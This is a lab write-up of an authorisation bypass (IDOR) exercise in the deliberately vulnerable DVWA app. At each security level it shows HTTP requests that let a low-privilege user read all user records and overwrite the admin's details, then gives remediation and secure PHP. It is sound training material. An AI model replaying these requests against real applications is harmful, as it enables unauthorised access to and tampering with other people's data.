# Lab Write-Up: Authorisation Bypass (IDOR)
**Date:** 2026-09-19  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Broken Access Control / IDOR  
**OWASP Top 10:** A01:2021 – Broken Access Control  

---

## 1. Introduction

Authorisation Bypass (also known as Broken Access Control or Insecure Direct Object Reference — IDOR) occurs when an application fails to enforce proper permissions on its functions or resources. Users can access data or functionality intended only for other users (horizontal privilege escalation) or higher-privileged roles (vertical privilege escalation).

**Goal of this lab:** Demonstrate that a low-privileged user (gordonb) can access and modify user data that should only be accessible to administrators.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA – Authorisation Bypass Module   |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Burp Suite, Browser                  |
| **Network**      | Local lab (NAT/Host-Only)            |
| **Admin User**   | `admin:password`                     |
| **Low-Priv User**| `gordonb:abc123`                     |

---

## 3. Vulnerability Overview

### What is Authorisation Bypass / IDOR?

Access control enforces that users can only access resources they are explicitly permitted to. IDOR specifically occurs when an internal object reference (like a user ID, filename, or record number) is exposed and not validated against the requesting user's permissions.

**Common patterns:**
```
Vulnerable: GET /user?id=1    (any user can change id=2, id=3...)
Vulnerable: GET /admin/users  (non-admin can browse the URL directly)
Vulnerable: POST /api/delete?user_id=5 (no ownership check)
```

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Log in as `gordonb:abc123`. Navigate to DVWA → Authorisation Bypass. Set security to **Low**.

#### Step 1 – Understand the Module

The module simulates a user management system exposed at `/vulnerabilities/authbypass/`.

As admin, the page shows:
- A list of users fetched via `/authbypass/get_user_data.php`
- An edit form that submits to `/authbypass/change_user_details.php`

#### Step 2 – Identify Accessible Endpoints (as Admin)

Log in as admin, intercept requests in Burp. Observe:

**Data fetch:**
```
GET /dvwa/vulnerabilities/authbypass/get_user_data.php HTTP/1.1
Cookie: PHPSESSID=ADMIN_SESSION; security=low
```

**User update:**
```
POST /dvwa/vulnerabilities/authbypass/change_user_details.php HTTP/1.1
Cookie: PHPSESSID=ADMIN_SESSION; security=low

first_name=Admin&last_name=User&email=admin@test.com&id=1
```

#### Step 3 – Switch to Low-Privilege User

Log out and log in as `gordonb:abc123`.

#### Step 4 – Access Admin-Only Endpoints Directly

As `gordonb`, the admin menu link is **hidden** in the navigation. However, navigate directly to the URL:

```
http://localhost/dvwa/vulnerabilities/authbypass/
```

**Result:** Page loads and shows the admin user management interface. ✅

The UI was hidden from gordonb, but **not the underlying functionality**.

#### Step 5 – Enumerate All Users (IDOR)

With gordonb's session, fetch all user data:
```
GET /dvwa/vulnerabilities/authbypass/get_user_data.php HTTP/1.1
Cookie: PHPSESSID=GORDONB_SESSION; security=low
```

**Response:**
```json
[
  {"id":1,"first_name":"admin","last_name":"admin","email":"admin@dvwa.local"},
  {"id":2,"first_name":"Gordon","last_name":"Brown","email":"gordonb@dvwa.local"},
  ...
]
```

✅ gordonb can read all users' data.

#### Step 6 – Modify Another User's Details

```
POST /dvwa/vulnerabilities/authbypass/change_user_details.php HTTP/1.1
Cookie: PHPSESSID=GORDONB_SESSION; security=low

first_name=HACKED&last_name=BYGORDON&email=hacked@evil.com&id=1
```

**Result:** Admin's details modified by a low-privilege user. ✅

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** Direct access to the HTML page now returns "Unauthorised" for non-admin users.

#### Step 1 – Confirm Page is Blocked

Navigate as gordonb to:
```
http://localhost/dvwa/vulnerabilities/authbypass/
```

**Result:** `Unauthorised` page shown.

#### Step 2 – Test the API Endpoints Directly

The page access is blocked, but the **backend API endpoints** may not be:

```
GET /dvwa/vulnerabilities/authbypass/get_user_data.php HTTP/1.1
Cookie: PHPSESSID=GORDONB_SESSION; security=medium
```

**Result:** Returns all user data ✅ — API has no access check!

#### Step 3 – Modify Data via Direct API Call

```
POST /dvwa/vulnerabilities/authbypass/change_user_details.php HTTP/1.1
Cookie: PHPSESSID=GORDONB_SESSION; security=medium
Content-Type: application/x-www-form-urlencoded

first_name=HACKED&last_name=BYGORDON&email=hacked@evil.com&id=1
```

**Result:** Admin's details modified ✅

**Key takeaway:** The developer protected the UI but forgot the underlying API — a classic mistake.

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** The HTML page AND the `get_user_data.php` endpoint are now protected. But...

#### Step 1 – Test All Endpoints

```
GET /dvwa/vulnerabilities/authbypass/            → 403 Unauthorised
GET /dvwa/vulnerabilities/authbypass/get_user_data.php  → 403 Unauthorised
POST /dvwa/vulnerabilities/authbypass/change_user_details.php → ?
```

#### Step 2 – Test the Write Endpoint

```
POST /dvwa/vulnerabilities/authbypass/change_user_details.php HTTP/1.1
Cookie: PHPSESSID=GORDONB_SESSION; security=high
Content-Type: application/x-www-form-urlencoded

first_name=HACKED&last_name=BYHIGH&email=hacked@evil.com&id=1
```

**Result:** ✅ Success — the POST (write) endpoint is STILL unprotected!

**Key takeaway:** The developer protected GET operations but missed the POST/write operations — data modification still possible.

---

## 5. Horizontal vs Vertical Privilege Escalation

| Type                   | Example in this lab                       |
|------------------------|-------------------------------------------|
| Horizontal escalation  | gordonb accessing/editing other users     |
| Vertical escalation    | gordonb accessing admin-only functionality|

Both are demonstrated here — gordonb can:
1. Access admin panel (vertical)
2. View/edit ANY user's data (horizontal)

---

## 6. Findings Summary

| Security Level | Page Protected | API Protected | Write Protected |
|----------------|----------------|---------------|-----------------|
| Low            | ❌ No          | ❌ No         | ❌ No           |
| Medium         | ✅ Yes         | ❌ No         | ❌ No           |
| High           | ✅ Yes         | ✅ Yes        | ❌ No           |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 9.1      |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: Medium |

**Business Impact:**
- Any authenticated user can read/modify all user records
- Account takeover without knowing passwords
- Data breach of all user PII
- Regulatory violations (GDPR, HIPAA)
- Financial fraud if payment data is involved

---

## 8. Remediation Recommendations

| Fix                               | Description                                                       |
|-----------------------------------|-------------------------------------------------------------------|
| **Server-Side Authorization**     | Check permissions for EVERY request, not just UI visibility       |
| **Protect All Endpoints**         | Secure API endpoints with the same access controls as UI         |
| **Principle of Least Privilege**  | Users should only access resources they own                       |
| **Ownership Validation**          | For updates, verify the user owns the record (or has permission) |
| **Access Control Framework**      | Use a consistent, centralized access control mechanism            |
| **Security Testing**              | Test every endpoint as a low-privilege user (IDOR testing)       |

**Secure Code (PHP):**
```php
// Vulnerable
function changeUserDetails($id, $data) {
    // No ownership check!
    DB::update("users", $data, ['id' => $id]);
}

// Secure
function changeUserDetails($id, $data, $requesting_user) {
    // Check: is the requesting user admin OR the owner of this record?
    if (!$requesting_user->isAdmin() && $requesting_user->id !== $id) {
        http_response_code(403);
        die('Forbidden: You do not have permission to modify this record.');
    }
    DB::update("users", $data, ['id' => $id]);
}
```

---

## 9. References

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger – Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [DVWA Authorisation Bypass – ch3ngo](https://ch3ngo.github.io/posts/authorisation-bypass_dvwa_walkthrough/)
- [DVWA Authorisation Bypass – cspanias](https://cspanias.github.io/posts/DVWA-Authorisation-Bypass)
- [OWASP Testing for IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA – Authorisation Bypass Module
User:      gordonb (low-privilege)
Attack:    Direct API calls to /authbypass/change_user_details.php
Result:    Admin user details modified by low-privilege user
Test:      All 3 levels vulnerable via unprotected write endpoint
Severity:  CRITICAL (CVSS 9.1)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
